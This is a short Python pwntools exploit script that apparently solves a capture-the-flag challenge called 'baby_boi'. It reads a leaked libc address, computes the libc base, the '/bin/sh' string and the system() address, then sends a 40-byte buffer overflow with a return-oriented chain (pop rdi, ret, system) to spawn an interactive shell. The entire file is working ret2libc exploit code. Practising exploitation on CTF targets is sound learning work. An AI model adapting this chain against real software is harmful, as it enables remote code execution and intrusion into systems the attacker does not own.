#!/usr/bin/python2
from pwn import *

p = process('./baby_boi')

p.recvuntil('am: ')
leak = int(p.recvline()[:-1],16)
log.info("Leak add : {} ".format(hex(leak)))
base = leak - 0x064e10
log.info("Base add : {}".format(hex(base)))
libc = base + 0x1b75aa
log.info("Libc add : {}".format(hex(libc)))
system = base + 0x055410
log.info("System add : {}".format(hex(system)))

payload = ""
payload += "A"*40
payload += p64(0x0000000000400793) #rdi
payload += p64(libc)
payload += p64(0x000000000040054e) #ret
payload += p64(system)


p.sendline(payload)
p.interactive()